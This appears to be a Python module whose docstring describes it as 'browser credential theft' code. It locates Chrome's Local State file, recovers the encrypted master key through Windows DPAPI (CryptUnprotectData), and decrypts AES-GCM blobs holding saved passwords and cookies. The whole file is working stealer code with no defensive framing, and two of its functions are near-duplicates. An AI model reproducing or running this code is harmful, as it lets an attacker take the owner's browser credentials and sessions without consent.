"""Windows DPAPI master key decryption for browser credential theft."""
import os


def _crypt_unprotect(data: bytes):
    if os.name != 'nt':
        return None
    import ctypes
    from ctypes import wintypes

    class DB(ctypes.Structure):
        _fields_ = [('cb', wintypes.DWORD), ('pb', ctypes.POINTER(ctypes.c_ubyte))]

    buf = ctypes.create_string_buffer(data, len(data))
    blob_in = DB(len(data), ctypes.cast(buf, ctypes.POINTER(ctypes.c_ubyte)))
    blob_out = DB()
    if not ctypes.windll.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
        return None
    result = ctypes.string_at(blob_out.pb, blob_out.cb)
    ctypes.windll.kernel32.LocalFree(blob_out.pb)
    return result


def get_master_key():
    if os.name != 'nt':
        return None
    import json, base64
    path = os.path.join(
        os.environ.get('LOCALAPPDATA', ''), r'Google\Chrome\User Data\Local State')
    if not os.path.exists(path):
        return None
    with open(path, 'r', encoding='utf-8') as f:
        b64_key = json.load(f).get('os_crypt', {}).get('encrypted_key')
    return _crypt_unprotect(base64.b64decode(b64_key)[5:]) if b64_key else None


def decrypt_blob(encrypted_data: bytes, master_key: bytes):
    try:
        from Crypto.Cipher import AES
        nonce = encrypted_data[3:15]
        tag = encrypted_data[-16:]
        ct = encrypted_data[15:-16]
        return AES.new(master_key, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag)
    except Exception:
        return None


def decrypt_dpapi_blob(encrypted: bytes):
    if os.name != 'nt':
        return None
    result = _crypt_unprotect(encrypted)
    if result is not None:
        return result
    key = get_master_key()
    return decrypt_blob(encrypted, key) if key else None


def extract_chrome_key(path=None):
    if os.name != 'nt':
        return None
    import json, base64
    p = path or os.path.join(
        os.environ.get('LOCALAPPDATA', ''), r'Google\Chrome\User Data\Local State')
    if not os.path.exists(p):
        return None
    with open(p, 'r', encoding='utf-8') as f:
        b64_key = json.load(f).get('os_crypt', {}).get('encrypted_key')
    return _crypt_unprotect(base64.b64decode(b64_key)[5:]) if b64_key else None
